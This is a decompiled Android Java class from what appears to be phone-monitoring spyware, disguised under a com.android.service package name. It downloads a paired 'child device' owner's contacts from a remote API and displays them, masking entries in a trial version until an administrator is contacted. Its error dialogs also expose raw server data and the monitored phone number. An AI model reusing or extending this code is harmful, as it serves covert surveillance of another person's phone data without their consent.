package com.android.service.view;

import android.content.Context;
import android.util.Log;
import com.android.service.XmppService;
import com.xmpp.client.util.HttpClinentModle;
import com.xmpp.client.util.PushDialogModle;
import java.util.ArrayList;
import java.util.List;
import java.util.StringTokenizer;
import org.jivesoftware.smackx.packet.IBBExtensions.Data;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class ContactsDataBean {
    private Context ctx;
    private HttpClinentModle hcm = new HttpClinentModle(this.ctx);
    private List<String> list;
    private List<String> list2;
    private List<String> listtime;
    private List<String> listtype;
    private PushDialogModle pdm = new PushDialogModle(this.ctx);
    private String strSelect_Pairnum;
    private String strVersion;

    public ContactsDataBean(Context context, String Version, String Select_Pairnum) {
        this.ctx = context;
        this.strVersion = Version;
        this.strSelect_Pairnum = Select_Pairnum;
    }

    public void UpdataJason(String strHostname) {
        JsonParser(this.hcm.HttpClinentJason("http://" + strHostname + "/API/GetContacts.ashx?phonenum=" + this.strSelect_Pairnum));
        ContactsViewActivity.contact_lv.setAdapter(new ContactsAdapter(this.ctx, this.list, this.list2));
    }

    private void JsonParser(String strJason) {
        this.list = new ArrayList();
        this.list2 = new ArrayList();
        try {
            JSONObject json = new JSONObject(strJason);
            if (json.getString("success").equalsIgnoreCase("true")) {
                String strtime = json.getString("AddTime");
                JSONArray nameList = json.getJSONArray(Data.ELEMENT_NAME);
                ContactsViewActivity.contact_update_time.setText(strtime);
                if (nameList.length() > 0) {
                    for (int i = 0; i < nameList.length(); i++) {
                        StringTokenizer st2 = new StringTokenizer(nameList.getJSONObject(i).getString("str"), XmppService.strCheckTag);
                        String smssub1 = "";
                        String smssub2 = "";
                        int n = 0;
                        while (st2.hasMoreElements()) {
                            if (n == 0) {
                                smssub1 = st2.nextToken();
                            } else {
                                smssub2 = st2.nextToken();
                            }
                            n++;
                        }
                        if (smssub2 != null && smssub2.length() > 0) {
                            if (this.strVersion.equalsIgnoreCase("1")) {
                                this.list.add(smssub1);
                                this.list2.add(smssub2);
                            } else {
                                if (!(smssub1 == null || smssub2 == null)) {
                                    if (smssub1.length() > 2) {
                                        smssub1 = smssub1.replace(smssub1.substring(2, smssub1.length()), "xxxxxx");
                                    } else {
                                        smssub1 = smssub1.replace(smssub1, "xx");
                                    }
                                    if (smssub2.length() > 5) {
                                        smssub2 = smssub2.replace(smssub2.substring(5, smssub2.length()), "xxxxx");
                                    } else {
                                        smssub2 = smssub2.replace(smssub2, "xxxxx");
                                    }
                                }
                                this.list.add(smssub1);
                                this.list2.add(new StringBuilder(String.valueOf(smssub2)).append("\n\n試用版將提供部分內容，如需觀看全部內容請與管理人員聯絡").toString());
                            }
                        }
                    }
                    return;
                }
                this.pdm.PushAlertSingleButton("訊息通知", "子機目前無簡訊資料!!");
                return;
            }
            this.pdm.PushAlertSingleButton("伺服器訊息", json.getString("reason"));
        } catch (JSONException e) {
            this.pdm.PushAlertSingleButton("系統出錯", new StringBuilder(String.valueOf(strJason)).append(this.strSelect_Pairnum).append(":").append(Log.getStackTraceString(e)).toString());
        } catch (Exception e2) {
            this.pdm.PushAlertSingleButton("系統出錯", new StringBuilder(String.valueOf(strJason)).append(this.strSelect_Pairnum).append(":").append(Log.getStackTraceString(e2)).toString());
        }
    }
}
